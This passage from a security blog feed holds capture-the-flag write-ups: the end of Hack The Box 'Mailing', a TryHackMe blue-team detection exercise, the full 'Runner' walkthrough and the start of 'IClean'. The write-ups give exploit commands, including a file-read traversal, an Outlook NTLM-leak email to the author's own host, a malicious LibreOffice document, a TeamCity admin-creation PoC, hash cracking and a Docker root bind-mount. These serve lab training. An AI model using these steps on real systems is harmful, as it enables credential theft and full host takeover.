<p>This <a href="https://www.hmailserver.com/forum/viewtopic.php?t=29069" target="_blank" >post</a>

 tells us that by default the ini file is in <code>C:\Program Files\hMailServer\Bin</code> but using <code>../../Program+Files/hMailServer/Bin/hMailServer.ini</code> as our payload returns <code>File not found</code>.</p>
<p>We learn from <a href="https://www.hmailserver.com/forum/viewtopic.php?t=38903" target="_blank" >this</a>

 forum discussion that the ini file can also be in <code>program files (x86)\hMailServer\Bin\hMailServer.ini</code>.</p>
<p>With the payload <code>../../Program+Files+(x86)/hMailServer/Bin/hMailServer.ini</code> we discover some information about the hMailServer service running on the target.</p>
<p><img src="/images/HTB-Mailing/INI-file.png" alt="LFI for hmailserver INI file"></p>
<p><img src="/images/HTB-Mailing/INI-file-pwds.png" alt="INI file - passwords found"></p>
<p>The file contains two password hashes, the administrative password which is <code>841bb5acfa6779ae432fd7a4e6600ba7</code> and a user password <code>0a9f8ad8bf896b501dde74f08efd7e4c</code>. It also reveals the software directories and the database in use (MSSQL).</p>
<p>Using <a href="https://crackstation.net/" target="_blank" >CrackStation</a>

 we find the administrator password to be <code>homenetworkingadministrator</code>.</p>
<p><img src="/images/HTB-Mailing/admin-pwd.png" alt="admin password"></p>
<blockquote>
<p>We aren&rsquo;t able to crack the second hash.</p>
</blockquote>
<h2 id="initial-foothold">Initial Foothold</h2>
<p>We can use Telnet to test the POP3 connection, the steps are explained <a href="https://www.resellerspanel.com/articles/cloud-web-hosting-articles/email/testing-incoming-mail-pop3-settings-via-telnet/" target="_blank" >here</a>

.</p>
<pre tabindex="0"><code>telnet 10.129.59.26 110

USER administrator@mailing.htb
PASS homenetworkingadministrator
</code></pre><p><img src="/images/HTB-Mailing/pop3-check.png" alt="POP3 mail box check"></p>
<p>The mailbox is empty but we know that there is a mail server set up with authentication. On the website we can read <code>Using any mail client you can connect to our server with your account with any system (Linux, MacOS or Windows)</code>.</p>
<p>The target is running Windows so it is most likely using Microsoft Outlook. One of the most recent vulnerability in Outlook is <a href="https://blog.checkpoint.com/research/check-point-research-unveils-critical-monikerlink-vulnerability-in-microsoft-outlook-with-a-9-8-cvss-severity-score/" target="_blank" >MonikerLink</a>

, which can lead to the leaking of local NTLM credential information.</p>
<blockquote>
<p>TryhackMe has a <a href="https://tryhackme.com/r/room/monikerlink" target="_blank" >room</a>

 specifically dedicated to that vulnerability.</p>
</blockquote>
<p>Knowing this we find a PoC for this vulnerability <a href="https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability" target="_blank" >here</a>

. We can use it to send an email to a valid user and leak their NTLM hash.</p>
<blockquote>
<p>After reading the instructions PDF (available for download on the website) we discover that <code>maya@mailing.htb</code> is a valid user on the server on (page 16).</p>
</blockquote>
<ol>
<li>Setup Responder</li>
</ol>
<pre tabindex="0"><code>sudo responder -I tun0
</code></pre><ol start="2">
<li>Send the email</li>
</ol>
<pre tabindex="0"><code>python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url &#39;\\MY_IP_ADDRESS\test&#39; --subject Hi
</code></pre><p><img src="/images/HTB-Mailing/email_sent_poc.png" alt="Email sent via PoC"></p>
<ol start="3">
<li>Crack the hash received in Responder</li>
</ol>
<p><img src="/images/HTB-Mailing/responder-hash.png" alt="Hash obtained for maya"></p>
<pre tabindex="0"><code>hashcat -a 0 -m 5600 maya_hash.txt /usr/share/wordlists/rockyou.txt
</code></pre><p><img src="/images/HTB-Mailing/maya-pwd.png" alt="Maya password"></p>
<p>After cracking the hash with hashcat we recover the password <code>m4y4ngs4ri</code> and with Evil-WinRM we login as Maya with the command below.</p>
<pre tabindex="0"><code>evil-winrm -i TARGET_IP -u maya -p m4y4ngs4ri
</code></pre><p>The user flag is in <code>C:\Users\maya\Desktop</code>.</p>
<p><img src="/images/HTB-Mailing/user-flag.png" alt="user flag location"></p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>In <code>C:\Users\maya\Documents</code> we find two files <code>mail.py</code> and <code>mail.vbs</code>. Both scripts automate interactions with an email client (most likely Microsoft Outlook) by opening unread emails.</p>
<p>Now since we have some automated tasks setup they have to be configured in some way in order to actually be executed. We can find the scheduled tasks on Windows with the <code>schtasks</code> command-line tool.</p>
<pre tabindex="0"><code>schtasks /query /fo LIST /v
</code></pre><p>We indeed have tasks related to <code>mail.py</code> and <code>mail.vbs</code>. Furthermore there is another task called <code>\Test</code> that executes a PowerShell script located at <code>C:\Users\localadmin\Documents\scripts\soffice.ps1</code>.</p>
<p><img src="/images/HTB-Mailing/Test-scheduled-task.png" alt="Test scheduled task"></p>
<p>Unfortunately we are unable to view the content of <code>localadmin</code>.</p>
<p><img src="/images/HTB-Mailing/access-denied-localadmin.png" alt="localadmin user, access denied"></p>
<p>In <code>Program Files</code> we notice that <code>Libre Office</code> is installed. This is noteworthy (at least for me) as it&rsquo;s usually used on Linux systems. The file <code>readme_en-US.txt</code> in <code>C:\Program Files\libreOffice\readmes</code> reveals the version running.</p>
<p><img src="/images/HTB-Mailing/LibreOffice-version.png" alt="Libre Office version"></p>
<p>In <code>C:\Program Files\LibreOffice\program\</code> we find a <code>soffice.ps1</code> script.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Set the directory where the .odt files are located</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>directory <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;C:\Users\Public\Documents&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get all files with .odt extension in the specified directory</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>files <span style="color:#f92672">=</span> Get<span style="color:#f92672">-</span>ChildItem <span style="color:#f92672">-</span>Path <span style="color:#960050;background-color:#1e0010">$</span>directory <span style="color:#f92672">-</span>Filter <span style="color:#f92672">*.</span>odt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Loop through each .odt file and open it</span>
</span></span><span style="display:flex;"><span>foreach (<span style="color:#960050;background-color:#1e0010">$</span>file <span style="color:#f92672">in</span> <span style="color:#960050;background-color:#1e0010">$</span>files) {
</span></span><span style="display:flex;"><span>    Start<span style="color:#f92672">-</span>Process <span style="color:#960050;background-color:#1e0010">$</span>file<span style="color:#f92672">.</span>FullName
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The script automates the process of opening all OpenDocument Text files (<code>*.odt</code>) located in the specified directory.</p>
<p>Going back to the LibreOffice version we find a PoC <a href="https://github.com/elweth-sec/CVE-2023-2255" target="_blank" >here</a>

 for <a href="https://www.libreoffice.org/about-us/security/advisories/cve-2023-2255/" target="_blank" >CVE-2023-2255</a>

.</p>
<p>Knowing that <code>.odt</code> files are automatically opened when placed in a certain directory, we can craft a malicious file that will execute commands when opened. We will create a file to add <code>maya</code> to the adminstrators group.</p>
<p>We don&rsquo;t find the usual <code>Administrators</code> directory in <code>C:\Users</code>, instead we have a user called <code>localadmin</code>. With <code>net user localadmin</code> we confirm that it is part of the administrators group called <code>Administradores</code> in this case.</p>
<p><img src="/images/HTB-Mailing/localadmin-memberships.png" alt="localadmin membership"></p>
<pre tabindex="0"><code>git clone https://github.com/elweth-sec/CVE-2023-2255

python3 CVE-2023-2255.py --cmd &#39;net localgroup Administradores maya /add&#39; --output &#39;exploit.odt&#39;
</code></pre><p><img src="/images/HTB-Mailing/malicious_odt_file.png" alt="Malicious odt file"></p>
<p>The malicious odt file is sent to the target using a SMB server but after placing it in <code>C:\Users\Public\Documents</code> nothing happened.</p>
<blockquote>
<p>After scratching my head for a long time I noticed another interesting directory.</p>
</blockquote>
<p>We find a directory called <code>Important Documents</code> in <code>C:\</code>, checking its permissions we notice that members of the <code>Administradores</code> group have full control <code>(F)</code> permissions on the directory. Moreover Maya has modify <code>(M)</code> permissions on it too.</p>
<p><img src="/images/HTB-Mailing/folder-permissions.png" alt="Important Documents directory permissions"></p>
<p>So let&rsquo;s place our malicious file there.</p>
<ol>
<li>Start a SMB server</li>
</ol>
<pre tabindex="0"><code>impacket-smbserver mailing `pwd` -smb2support
</code></pre><ol start="2">
<li>Connect to the SMB server with user maya</li>
</ol>
<pre tabindex="0"><code>net use \\MY_IP\mailing
</code></pre><ol start="3">
<li>Move into <code>C:\Important Documents</code> and download the malicious file</li>
</ol>
<pre tabindex="0"><code>cd &#39;Important Documents&#39;
copy \\MY_IP\mailing\exploit.odt
</code></pre><ol start="4">
<li>Wait a little bit then confirms that Maya is now part of the <code>Administradores</code> group with <code>net user maya</code>.</li>
</ol>
<p><img src="/images/HTB-Mailing/maya_admin.png" alt="maya now part of admin group"></p>
<p>Log out of Evil-WinRM and login again for the privilege to take effect. You can now access the <code>C:\Users\localadmin\Desktop</code> where you will find the root flag.</p>
<p><img src="/images/HTB-Mailing/root-flag.png" alt="Root flag"></p>
<p>Thank you for reading this write up!</p>
]]></content>
        </item>
        
        <item>
            <title>THM: Summit</title>
            <link>https://scorpiosec.com/posts/2024/08/thm-summit/</link>
            <pubDate>Thu, 29 Aug 2024 21:44:51 -0500</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/08/thm-summit/</guid>
            <description>This is a blue team challenge where we need to create defensive countermeasures for various malware samples. This will be achieved by using file hashes, IP addresses, firewall rules, DNS and sigma rules.
Platform: TryHackMe Link: Summit Level: Easy What is the first flag you receive after successfully detecting sample1.exe? After navigating to the link provided, go to Malware Snadbox, the file sample1.exe is already loaded and click on Submit for Analysis.</description>
            <content type="html"><![CDATA[<p>This is a blue team challenge where we need to create defensive countermeasures for various malware samples. This will be achieved by using file hashes, IP addresses, firewall rules, DNS and sigma rules.</p>
<ul>
<li>Platform: TryHackMe</li>
<li>Link: <a href="https://tryhackme.com/r/room/summit" target="_blank" >Summit</a>

</li>
<li>Level: Easy</li>
</ul>
<h2 id="what-is-the-first-flag-you-receive-after-successfully-detecting-sample1exe">What is the first flag you receive after successfully detecting sample1.exe?</h2>
<p>After navigating to the link provided, go to <code>Malware Snadbox</code>, the file <code>sample1.exe</code> is already loaded and click on <code>Submit for Analysis</code>.</p>
<p><img src="/images/THM-Summit/malware_sandbox.png" alt="Malware Sandbox"></p>
<p><img src="/images/THM-Summit/submit_for_analysis.png" alt="Submit for analysis button"></p>
<p>After the analysis is completed, we get three hash values.</p>
<p><img src="/images/THM-Summit/general_info.png" alt="Sample1 analysis results"></p>
<p>Back to the drop down menu, there is a <code>Manage Hashes</code> section, copy one of the hashes, check the correct <code>Hash Algorithm</code> box and submit it.</p>
<p><img src="/images/THM-Summit/detect_hashes.png" alt="Detect Hashes"></p>
<p>You will get some results and an email (check the <code>Mail</code> section in the drop down menu) with the first flag.</p>
<p><img src="/images/THM-Summit/hash_blocklist.png" alt="Hash Blocklist"></p>
<p><img src="/images/THM-Summit/first_flag.png" alt="First flag"></p>
<h2 id="what-is-the-second-flag-you-receive-after-successfully-detecting-sample2exe">What is the second flag you receive after successfully detecting sample2.exe?</h2>
<p>Using the same process we analyze <code>sample2.exe</code>. The report tells us that this file tries to send an HTTP request to IP address <code>154.35.10.113:4444</code>.</p>
<blockquote>
<p>If we try to get the flag via hash submission we are told that it requires another method.</p>
</blockquote>
<p><img src="/images/THM-Summit/sample2_network_activity.png" alt="Sample2 analysis results"></p>
<p>Let&rsquo;s create a rule in the <code>Firewall Rule Manager</code> section.</p>
<p><img src="/images/THM-Summit/firewall_rule_manager.png" alt="Firewall rule manager"></p>
<p>After saving that rule we get flag 2 in our mail.</p>
<p><img src="/images/THM-Summit/flag_2.png" alt="Second flag"></p>
<h2 id="what-is-the-third-flag-you-receive-after-successfully-detecting-sample3exe">What is the third flag you receive after successfully detecting sample3.exe?</h2>
<p>After analyzing <code>sample3.exe</code>, we notice some HTTP requests to IP <code>62.123.140.9</code> and DNS requests to <code>emudyn.bresonicz.info</code> with the same IP address.</p>
<p><img src="/images/THM-Summit/sample3_network_activity.png" alt="Sample3 analysis results"></p>
<p>We head to the <code>DNS Filter</code> section and create a DNS rule for that domain which gets us the third flag.</p>
<p><img src="/images/THM-Summit/DNS_malicious_domain.png" alt="DNS Rule Manager"></p>
<p><img src="/images/THM-Summit/flag_3.png" alt="Third flag"></p>
<h2 id="what-is-the-fourth-flag-you-receive-after-successfully-detecting-sample4exe">What is the fourth flag you receive after successfully detecting sample4.exe?</h2>
<p>From the previous email, we know that blocking hashes, IPs, or domain will not solve our problem. We need to look deeper.</p>
<p>The analysis report of <code>sample4.exe</code> shows some registry activity.</p>
<p><img src="/images/THM-Summit/sample4_registry_activity.png" alt="sample4 analysis results"></p>
<p>We will use the <code>Sigma Rule Builder</code> for this case. For Step 1 we choose <code>Sysmon Event Logs</code> and for Step 2 we pick <code>Registry Modifications</code>. In Step 3 we enter the values from the report.</p>
<blockquote>
<p>If you google <code>att&amp;ck DisableRealtimeMonitoring ID</code> you will see that its ID is <code>T1562.002</code> which falls under <a href="https://attack.mitre.org/tactics/TA0005/" target="_blank" >Defense Evasion</a>

 with ID <code>TA0005</code>.</p>
</blockquote>
<table>
<thead>
<tr>
<th>Registry Key</th>
<th>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection</th>
</tr>
</thead>
<tbody>
<tr>
<td>Registry Name</td>
<td>DisableRealtimeMonitoring</td>
</tr>
<tr>
<td>Value</td>
<td>1</td>
</tr>
<tr>
<td>ATT&amp;CK ID</td>
<td>Defense Evasion (TA0005)</td>
</tr>
</tbody>
</table>
<p><img src="/images/THM-Summit/Sigma_rule.png" alt="Sigma rule for sample4"></p>
<p>After validating the rule we get flag 4 in our inbox.</p>
<p><img src="/images/THM-Summit/flag_4.png" alt="Fourth flag"></p>
<h2 id="what-is-the-fifth-flag-you-receive-after-successfully-detecting-sample5exe">What is the fifth flag you receive after successfully detecting sample5.exe?</h2>
<p>This time we have to focus on the logs to determine our countermeasure.</p>
<p><img src="/images/THM-Summit/log_file.png" alt="Log file for sample5"></p>
<p>After paying close attention we notice some recurring traffic on the same port at regular intervals. Every 30 minutes there is some outgoing traffic of 97 bytes to IP <code>51.102.10.19</code>. In the <code>Sigma Rule Builder</code> go to <code>Sysmon Event Logs</code>  -&gt; <code>Network connections</code>.</p>
<p>Because the threat actor can now change the artifacts we cannot rely of IP addresses, protocols, or port numbers. Also given the fact that the traffic occurs every 30 minutes we can assume that it uses an automated process probably via a C2 framework.</p>
<p>Using the values in the picture below we get the fifth flag.</p>
<p><img src="/images/THM-Summit/Sigma_rule_C2.png" alt="Sigma rule C2 server"></p>
<p><img src="/images/THM-Summit/flag_5.png" alt="Fifth flag"></p>
<h2 id="what-is-the-final-flag-you-receive-from-sphinx">What is the final flag you receive from Sphinx?</h2>
<p>We now need to make use of a commands log file.</p>
<p><img src="/images/THM-Summit/commands_log.png" alt="commands log file"></p>
<p>First we need to understand what those commands are doing. The commands suggest that the malware is performing reconnaissance and collecting information about the system, network, and user accounts. The output is stored in a log file (<code>exfiltr8.log</code>) in the temporary directory (<code>%temp%</code>), likely with the intention of exfiltrating this data to an external attacker.</p>
<p>The log file shows us that the temporary directory <code>%temp%</code> is always used in conjunction with a file named <code>exfiltr8.log</code>. So we should focus on that with our countermeasure.</p>
<p>Go to <code>Sigma Rule Builder</code> -&gt; <code>Sysmon Event Logs</code> -&gt; <code>FIle Creation and Modification</code> and use the options depicted below.</p>
<p><img src="/images/THM-Summit/sigma_rule_exfiltration.png" alt="Sigma rule data exfiltration malware"></p>
<p>We then get the final flag.</p>
<p><img src="/images/THM-Summit/final_flag.png" alt="Final flag"></p>
]]></content>
        </item>
        
        <item>
            <title>HTB: Runner</title>
            <link>https://scorpiosec.com/posts/2024/08/htb-runner/</link>
            <pubDate>Thu, 22 Aug 2024 19:24:15 -0500</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/08/htb-runner/</guid>
            <description>Platform: Hack The Box Link: Runner Level: Medium OS: Linux Runner starts with a basic website offering CI/CD solutions. Through subdomain enumeration, we uncover a vulnerable TeamCity instance (CVE-2023-42793), granting us access. A backup archive downloaded from this instance reveals a private SSH key and password hashes. Using the SSH key, we gain an initial foothold and retrieve the user flag. Further exploration uncovers another subdomain hosting a Portainer.io instance, which we access using the previously recovered credentials.</description>
            <content type="html"><![CDATA[<ul>
<li>Platform: Hack The Box</li>
<li>Link: <a href="https://app.hackthebox.com/machines/Runner" target="_blank" >Runner</a>

</li>
<li>Level: Medium</li>
<li>OS: Linux</li>
</ul>
<hr>
<p>Runner starts with a basic website offering CI/CD solutions. Through subdomain enumeration, we uncover a vulnerable TeamCity instance (CVE-2023-42793), granting us access. A backup archive downloaded from this instance reveals a private SSH key and password hashes. Using the SSH key, we gain an initial foothold and retrieve the user flag. Further exploration uncovers another subdomain hosting a Portainer.io instance, which we access using the previously recovered credentials. Privilege escalation is achieved by exploiting a bind mount, allowing access to the root directory of the target machine via the container.</p>
<p>Target IP address - <code>10.10.11.13</code></p>
<h2 id="scanning">Scanning</h2>
<blockquote>
<p>I am using a script for the scanning phase, you can find it <a href="https://github.com/K-Scorpio/scripts-collection/blob/main/nmap_scan.sh" target="_blank" >here</a>

. I found myself always running the same commands, so it makes things easier for me.</p>
</blockquote>
<pre tabindex="0"><code>./nmap_scan.sh 10.10.11.13 Runner
</code></pre><p><strong>Results</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Running detailed scan on open ports: 22,80,8000
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-22 19:23 CDT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.13
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.054s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE     VERSION
</span></span><span style="display:flex;"><span>22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp   open  http        nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://runner.htb/
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>8000/tcp open  nagios-nsca Nagios NSCA
</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/plain; charset<span style="color:#f92672">=</span>utf-8<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 9.64 seconds
</span></span></code></pre></div><p>The scan discovers three open ports 22 (SSH), 80 (HTTP with Nginx), and 8000 (nagios-nsca).
There is also a redirection to <code>runner.htb</code>.</p>
<p>Let&rsquo;s update our hosts file.</p>
<pre tabindex="0"><code>sudo echo &#34;10.10.11.13 runner.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id="enumeration">Enumeration</h2>
<p>We find a company website offering CI/CD solutions at <code>http://runner.htb</code>. This website does not present any features that we can exploit and directory enumeration does not return anything useful for <code>http://runner.htb</code>.</p>
<p><img src="/images/HTB-Runner/runner-website.png" alt="Runner website"></p>
<p>Moving on to subdomain enumeration, we find <code>teamcity</code> which we add to our <code>/etc/hosts</code> file.</p>
<pre tabindex="0"><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 100 -u http://runner.htb -H &#34;Host: FUZZ.runner.htb&#34; -ic -fs 154
</code></pre><p><img src="/images/HTB-Runner/ffuf-subdomain.png" alt="subdomain enumeration"></p>
<h2 id="initial-foothold">Initial Foothold</h2>
<p><code>http://teamcity.runner.htb</code> leads to a login form for TeamCity with version <code>2023.05.3</code>. Researching for specific vulnerabilities we discover <a href="https://www.exploit-db.com/exploits/51884" target="_blank" >CVE-2023-42793</a>

, allowing us to create a new user with administrative privileges.</p>
<p><img src="/images/HTB-Runner/teamcity-runner.png" alt="teamcity subdomain"></p>
<p>Using this <a href="https://github.com/H454NSec/CVE-2023-42793" target="_blank" >PoC</a>

 we exploit the vulnerability and create a new admin user with the credentials <code>H454NSec5438:@H454NSec</code>.</p>
<pre tabindex="0"><code>python3 CVE-2023-42793.py -u http://teamcity.runner.htb
</code></pre><p><img src="/images/HTB-Runner/Poc_use.png" alt="Poc in use"></p>
<p>We now login into the TeamCity instance.</p>
<p><img src="/images/HTB-Runner/teamcity-admin-login.png" alt="teamcity subdomain login"></p>
<p>In the <code>Administration</code> section, under <code>Server Administration</code> we find a <code>Backup</code> option and we use the <code>Start Backup</code> button to begin the process.</p>
<p><img src="/images/HTB-Runner/backup.png" alt="teamcity backup"></p>
<p><img src="/images/HTB-Runner/backup-start.png" alt="teamcity backup start"></p>
<p>After it&rsquo;s done we can download the archive by clicking on the link.</p>
<p><img src="/images/HTB-Runner/backup-file.png" alt="teamcity backup archive"></p>
<blockquote>
<p>After unzipping the archive I couldn&rsquo;t access the files because they didn&rsquo;t have any permissions set, so I changed them recursively on all files.</p>
</blockquote>
<pre tabindex="0"><code>unzip TeamCity_Backup_20240421_214500.zip &amp;&amp; chmod -R 744 *
</code></pre><p>We end up with several files and folders.</p>
<p><img src="/images/HTB-Runner/backup-files.png" alt="teamcity backup files"></p>
<p>We find a private SSH key at <code>config/projects/AllProjects/pluginData/ssh_keys/id_rsa</code> but as of now we don&rsquo;t know which user it belongs to.</p>
<p>We also find a list of users and their password hashes at <code>database_dump/users</code>.</p>
<blockquote>
<p><code>admin</code> and <code>matthew</code> are the interesting users here, the other users were created by our exploit.</p>
</blockquote>
<p><img src="/images/HTB-Runner/db-users-hashes.png" alt="user hashes"></p>
<p>The hash for <code>admin</code> (john) couldn&rsquo;t be cracked but we successfully recovered the password for <code>matthew</code> which is <code>piper123</code>.</p>
<pre tabindex="0"><code>hashcat -a 0 -m 3200 matthew-hash.txt /usr/share/wordlists/rockyou.txt
</code></pre><p><img src="/images/HTB-Runner/matthew-pwd.png" alt="user matthew hash cracked"></p>
<p>Using the previously found SSH key, we are able to login as <code>john</code> via SSH.</p>
<p><img src="/images/HTB-Runner/ssh-login-admin.png" alt="SSH admin login"></p>
<pre tabindex="0"><code>ssh -i id_rsa john@runner.htb
</code></pre><p><img src="/images/HTB-Runner/john-user.png" alt="john user"></p>
<p>The user flag is at <code>/home/john/user.txt</code>.</p>
<h2 id="privilege-escaltion">Privilege Escaltion</h2>
<p>Using <code>linpeas</code> for the system enumeration we find another subdomain that we were unable to discover previously, <code>portainer-administration.runner.htb</code>.</p>
<p><img src="/images/HTB-Runner/subdomain-intern.png" alt="subdomain internal"></p>
<p>At <code>http://portainer-administration.runner.htb/</code> we are presented with another login form for <code>portainer.io</code>. The credentials <code>matthew:piper123</code> work here!</p>
<p><img src="/images/HTB-Runner/portainer-login.png" alt="portainer login"></p>
<p>We are unable to modify the current container but we can create new volumes.</p>
<ol>
<li>Select the container <code>primary</code> and you will get a drop down menu in the left pane</li>
</ol>
<p><img src="/images/HTB-Runner/container-primary.png" alt="container primary"></p>
<ol start="2">
<li>Click on <code>Volumes</code> then <code>Add volume</code> in the right corner</li>
</ol>
<p><img src="/images/HTB-Runner/add-volume.png" alt="add volume for conmtainer"></p>
<ol start="3">
<li>When creating the volume use the <code>+ add driver option</code> and add the three options below in order to create a root volume.</li>
</ol>
<p><img src="/images/HTB-Runner/add_driver_options.png" alt="add driver option button"></p>
<p><img src="/images/HTB-Runner/volume-options.png" alt="volume options"></p>
<ul>
<li>The <strong>device</strong> option specifies the source path on the host system that will be mounted into the container. In this case, it&rsquo;s set to <code>/</code>, which is the root directory of the host machine.</li>
<li>The <strong>o</strong> option stands for &ldquo;options,&rdquo; and in this context, <code>bind</code> refers to a &ldquo;bind mount.&rdquo;</li>
<li>The <strong>type</strong> option defines the type of mount being used. When set to <code>none</code>, it indicates that no specific file system type is being used for this mount.</li>
</ul>
<ol start="4">
<li>In <code>Containers</code> we create a new container with <code>ubuntu</code> as the image name, make sure to check <code>Interactive &amp; TTY (-i -t)</code> for <code>Console</code> under <code>Advanced container settings</code>.</li>
</ol>
<p><img src="/images/HTB-Runner/console-interactive.png" alt="portainer console"></p>
<p>Under <code>Volumes</code> click on <code>+map additional volume</code>, for <code>container</code> enter <code>/mnt/root</code> and select the volume you just created, finally deploy the container.</p>
<p><img src="/images/HTB-Runner/advanced_container_settings_volume.png" alt="Advanced container settings, volume section"></p>
<ol start="5">
<li>You should now have a new running container</li>
</ol>
<p><img src="/images/HTB-Runner/myContainer.png" alt="created container"></p>
<p>Select it and click on <code>Console</code> and then <code>Connect</code>.</p>
<p><img src="/images/HTB-Runner/console-container.png" alt="container status"></p>
<ol start="6">
<li>You will login as root and the root flag is at <code>/mnt/root/root/root.txt</code>.</li>
</ol>
<p><img src="/images/HTB-Runner/root-flag.png" alt="Root flag"></p>
<h3 id="why-does-this-work">Why does this work?</h3>
<p>This privilege escalation technique takes advantage of the volume binding feature in Docker, specifically using Portainer.io as a management tool.</p>
<p>The volume in question is mounted to the container with the root file system (<code>/</code>) as its device and <code>bind</code> as the type. This means that the root file system of the host is being mounted to the container.</p>
<p>When we create a new container and mount this volume at <code>/mnt/root</code>, it essentially gives the container access to the root directory of the host machine.</p>
<p>Since the volume is bound to the host&rsquo;s root directory, and we&rsquo;ve logged into the container with an interactive console, we have direct access to the host’s file system from within the container.</p>
<p>By default, containers typically run as root inside their own environment, and because of the bind mount, this root user inside the container effectively has access to the root directory of the host. This allows us to manipulate or execute files on the host system as if we were the root user of the host, leading to full control over the host machine.</p>
<h2 id="closing-words">Closing Words</h2>
<p>I am not proficient with container hacking but this box prompted me to learn more about it. Below you will find a non-exhaustive list of the resources I used.</p>
<p>First we need to know what is Docker and what it is used for - <a href="https://www.youtube.com/watch?v=pg19Z8LL06w&amp;ab_channel=TechWorldwithNana" target="_blank" >Docker Crash Course</a>

.</p>
<p>Then we can learn about Docker exploitation:</p>
<ul>
<li><a href="https://www.practical-devsecops.com/lesson-4-hacking-containers-like-a-boss/" target="_blank" >Lesson 4: Hacking Containers Like A Boss</a>

</li>
<li><a href="https://www.youtube.com/watch?v=IuiJdQsty5k&amp;ab_channel=Docker" target="_blank" >Hacking into your containers, and how to stop it!</a>

</li>
<li><a href="https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker#privilege-escalation" target="_blank" >Pentesting Docker on HackTricks</a>

</li>
</ul>
<p>I hope you enjoyed this write up, thanks for taking the time to read it!</p>
]]></content>
        </item>
        
        <item>
            <title>HTB: IClean</title>
            <link>https://scorpiosec.com/posts/2024/08/htb-iclean/</link>
            <pubDate>Thu, 01 Aug 2024 17:57:29 -0500</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/08/htb-iclean/</guid>
            <description>Platform: Hack The Box Link: IClean Level: Medium OS: Linux IClean begins with a cleaning service website where we identify a form vulnerable to Cross-Site Scripting (XSS). Exploiting this vulnerability, we retrieve a session cookie and access the application dashboard. There, we discover an invoice generator susceptible to Server-Side Template Injection (SSTI), which provides our initial foothold. Further exploration reveals the database credentials, allowing us to recover password hashes. By cracking one of these hashes, we gain SSH access and retrieve the user flag.</description>
            <content type="html"><![CDATA[<ul>
<li>Platform: Hack The Box</li>
<li>Link: <a href="https://app.hackthebox.com/machines/IClean" target="_blank" >IClean</a>

</li>
<li>Level: Medium</li>
<li>OS: Linux</li>
</ul>
<hr>
<p>IClean begins with a cleaning service website where we identify a form vulnerable to Cross-Site Scripting (XSS). Exploiting this vulnerability, we retrieve a session cookie and access the application dashboard. There, we discover an invoice generator susceptible to Server-Side Template Injection (SSTI), which provides our initial foothold. Further exploration reveals the database credentials, allowing us to recover password hashes. By cracking one of these hashes, we gain SSH access and retrieve the user flag. To obtain the root flag, we must exploit qpdf, and this write-up will demonstrate two different methods to achieve this.</p>
<p>Target IP address - <code>10.10.11.12</code></p>
<h2 id="scanning">Scanning</h2>
<pre tabindex="0"><code>nmap -sC -sV -oA nmap/IClean 10.10.11.12
</code></pre><p><strong>Results</strong></p>
